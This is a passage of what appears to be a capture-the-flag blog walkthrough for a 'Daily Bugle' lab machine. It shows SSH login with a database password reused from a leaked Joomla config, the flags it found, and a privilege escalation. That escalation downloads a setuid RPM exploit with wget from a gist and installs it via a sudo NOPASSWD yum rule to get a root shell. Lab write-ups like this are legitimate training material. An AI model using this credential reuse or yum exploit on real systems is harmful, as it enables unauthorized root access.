style="color:#e6db74">&#39;; public $sef_rewrite = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $sef_suffix = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $unicodeslugs = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;; public $feed_limit = &#39;</span><span style="color:#ae81ff">10</span><span style="color:#e6db74">&#39;; public $feed_email = &#39;</span><span style="color:#a6e22e">none</span><span style="color:#e6db74">&#39;; public $log_path = &#39;</span><span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">/</span><span style="color:#a6e22e">administrator</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#e6db74">&#39;; public $tmp_path = &#39;</span><span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#e6db74">&#39;; public $lifetime = &#39;</span><span style="color:#ae81ff">15</span><span style="color:#e6db74">&#39;; public $session_handler = &#39;</span><span style="color:#a6e22e">database</span><span style="color:#e6db74">&#39;; public $shared_session = &#39;</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>; } 
</code></pre></div><p>Interesting. We can try the password to database if it is not the same to <strong>jjameson</strong> ssh login.</p>
<ul>
<li><strong>username</strong>: jjamesson</li>
<li><strong>password</strong>: nv5uz9r3ZEDzVjNu</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh jjameson@10.10.86.172
jjameson@10.10.162.2<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Last failed login: Fri Feb  <span style="color:#ae81ff">7</span> 10:07:52 EST <span style="color:#ae81ff">2020</span> from ip-10-8-11-158.eu-west-1.compute.internal on ssh:notty
There were <span style="color:#ae81ff">724</span> failed login attempts since the last successful login.
Last login: Mon Dec <span style="color:#ae81ff">16</span> 05:14:55 <span style="color:#ae81ff">2019</span> from netwars
</code></pre></div><p>Yes, everything works!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ ls
user.txt
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ cat user.txt 
27a260fe3cba712cfdedb1c86d80442e
</code></pre></div><p><strong>What is the user flag?</strong></p>
<ul>
<li>27a260fe3cba712cfdedb1c86d80442e</li>
</ul>
<p>The last step is gain root access on this machine. So let&rsquo;s do it!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ sudo -l                                                                                                                                                                                    
Matching Defaults entries <span style="color:#66d9ef">for</span> jjameson on dailybugle:                                                                                                                                                               
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS     
</span><span style="color:#e6db74">    LC_CTYPE&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET       
</span><span style="color:#e6db74">    XAUTHORITY&#34;</span>, secure_path<span style="color:#f92672">=</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin                                                                                                                                                       
                                                                                                                                                                                                                    
User jjameson may run the following commands on dailybugle:                                                                                                                                                         
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/yum
</code></pre></div><p><strong>Yum</strong> is the only one command you can run under <strong>root</strong> and that&rsquo;s security missconfiguration.
More about the vulnerability you can find 
<a href="https://lsdsecurity.com/2019/01/more-linux-privilege-escalation-yum-rpm-dnf-nopasswd-rpm-payloads/" target="_blank" rel="nofollow noreferrer noopener">here</a>.
You can download the exploit 
<a href="https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm" target="_blank" rel="nofollow noreferrer noopener">here</a></p>
<p>So let&rsquo;s download the exploit and copy to vulnerable server</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm
$ scp setuid-pop.rpm jjameson@10.10.86.172:~
</code></pre></div><p>Now extract the exploit and install it via <strong>yum</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ cat setuid-pop.rpm | base64 -d | gzip -d &gt; yumsploit.rpm
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ sudo yum localinstall ~/yumsploit.rpm 
Loaded plugins: fastestmirror
Examining /home/jjameson/yumsploit.rpm: sploit-1.0-1.x86_64
Marking /home/jjameson/yumsploit.rpm to be installed
Resolving Dependencies
--&gt; Running transaction check
---&gt; Package sploit.x86_64 0:1.0-1 will be installed
--&gt; Finished Dependency Resolution

Dependencies Resolved
...
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : sploit-1.0-1.x86_64                                                                                                                                                                              1/1 
  Verifying  : sploit-1.0-1.x86_64                                                                                                                                                                              1/1 

Installed:
  sploit.x86_64 0:1.0-1                              

Complete!
</code></pre></div><p>We have installed <strong>pop</strong> binary in <strong>/usr/local/bin</strong> directory with <strong>setuid bit</strong>.
That means <strong>pop</strong> binary will be runned with <strong>root</strong> priviledges.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meson@dailybugle ~<span style="color:#f92672">]</span>$ ls -la /usr/local/bin
total <span style="color:#ae81ff">12</span>
drwxr-xr-x.  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">17</span> Feb  <span style="color:#ae81ff">7</span> 10:43 .
drwxr-xr-x. <span style="color:#ae81ff">12</span> root root  <span style="color:#ae81ff">131</span> Dec <span style="color:#ae81ff">14</span> 13:57 ..
-rwsr-sr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">8744</span> Jan <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> pop
</code></pre></div><p>Let&rsquo;s execute it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ pop
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>jjameson<span style="color:#f92672">)</span> 
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># cat /root/root.txt</span>
eec3d53292b1821868266858d7fa6f79
</code></pre></div><p>Done! We have now <strong>root</strong> priviledges.</p>
<p><strong>What is the root flag?</strong></p>
<ul>
<li>eec3d53292b1821868266858d7fa6f79</li>
</ul>

    </div>
</article>
<div class="pagination">
    
    <div class="prev"> <a href="/ctf/citrix-vulnerability/">Previous Post</a> </div>
    
    
    <div class="next"> <a href="/ctf/bookface/">Next Post</a> </div>
    
</div>


        </main><footer class="site-footer">
	<span class="left">Gohugo/0.80.0 </span> 
	<span class="right">
		<em>.burso</em>
	</span>
</footer>
</body>
</html>
